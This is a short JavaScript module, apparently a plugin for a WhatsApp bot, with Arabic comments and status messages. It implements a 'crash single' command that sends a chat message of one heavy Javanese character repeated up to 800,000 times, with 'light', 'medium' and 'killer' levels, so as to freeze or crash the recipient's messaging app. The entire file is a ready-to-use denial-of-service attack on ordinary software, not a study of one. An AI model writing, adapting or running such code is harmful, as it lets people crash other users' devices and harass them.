module.exports = async ({ sock, msg, text, reply }) => {
    if (!text.startsWith("crash single")) return;

    const jid = msg.key.remoteJid;
    const heavyChar = "ꦾ"; // الرمز المطلوب

    try {
        let level = "killer";
        if (text.includes("light")) level = "light";
        if (text.includes("medium")) level = "medium";
        if (text.includes("killer")) level = "killer";

        // عدد التكرار حسب المستوى
        let repeatCount;
        switch (level) {
            case "light":
                repeatCount = 50000;  // خفيف
                break;
            case "medium":
                repeatCount = 200000; // متوسط
                break;
            case "killer":
                repeatCount = 800000; // قاتل
                break;
            default:
                repeatCount = 800000;
        }

        await reply(`⚠️ جاري توليد الرمز (${heavyChar}) بمستوى ${level}...`);

        const crashText = heavyChar.repeat(repeatCount);

        await sock.sendMessage(jid, { text: crashText });

        await reply(`✅ تم إرسال الرمز ${heavyChar} مكرر ${repeatCount} مرة! افتح الدردشة بحذر.`);
    } catch (error) {
        console.error("Crash Single Error:", error);
        await reply("❌ حدث خطأ أثناء تنفيذ أمر الكراش الأحادي.");
    }
};
